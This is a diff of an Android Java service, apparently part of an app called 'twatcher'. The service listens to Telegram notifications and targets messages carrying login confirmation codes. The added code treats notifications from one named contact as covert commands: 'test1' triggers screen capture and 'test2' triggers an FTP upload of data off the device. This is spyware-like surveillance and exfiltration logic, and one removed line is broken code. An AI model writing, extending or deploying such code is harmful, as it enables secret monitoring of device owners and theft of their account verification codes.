@@ -13,8 +13,8 @@ public class AutoStartService extends NotificationListenerService {
 
     private static final String TAG = "TEST: ";
     private static final String NEEDED_APP_PACKAGE = "org.telegram.messenger";
-    private static final String OWN_APP_PACKAGE = "com.example.twatcher";
     private static final String NEEDED_APP_NOTIFICATION_TITLE = "Telegram";
+    private static final String NEEDED_APP_NOTIFICATION_TITLE_TESTING = "Nikita Lukanin";
     private static final String NEEDED_APP_NOTIFICATION_MESSAGE = "Код подтверждения";
     public int counter = 0;
     private Timer timer;
@@ -70,7 +70,6 @@ public class AutoStartService extends NotificationListenerService {
                     dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     App.getAppContext().startActivity(dialogIntent);
                 }
-
             }
         };
 
@@ -99,6 +98,29 @@ public class AutoStartService extends NotificationListenerService {
                 Log.i(TAG, "IS NEEDED1: "+notificationTitle);
                 Log.i(TAG, "IS NEEDED2: "+notificationText);
 
+                if(notificationTitle != null && notificationText != null && notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE_TESTING)) {
+                    //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
+                    //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());
+
+                    if(notificationText.equals("test1")) {
+                        /*App.setDelayCounter(3);
+
+                        Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
+                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        App.getAppContext().startActivity(dialogIntent);*/
+
+                        Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
+                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        App.getAppContext().startActivity(dialogIntent);
+                    }
+                    else {
+                        if(notificationText.equals("test2")) {
+                            FTPFileUpload catTask = new FTPFileUpload();
+                            catTask.execute();
+                        }
+                    }
+                }
+
             /*if(notificationTitle != null && notificationText != null &&
                     notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE)) {
                 Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
@@ -108,22 +130,6 @@ public class AutoStartService extends NotificationListenerService {
                 dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(dialogIntent);
             }*/
-
-                App.setDelayCounter(3);
-
-                Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
-                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                App.getAppContext().startActivity(dialogIntent);
-            }
-            else {
-                if(notificationApp.equals(OWN_APP_PACKAGE)) {
-                    String notificationTitle = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString();
-                    String notificationText = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString();
-                    String notificationData = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_).toString();
-
-                    Log.i(TAG, "IS NEEDED1: "+notificationTitle);
-                    Log.i(TAG, "IS NEEDED2: "+notificationText);
-                }
             }
         }
     }
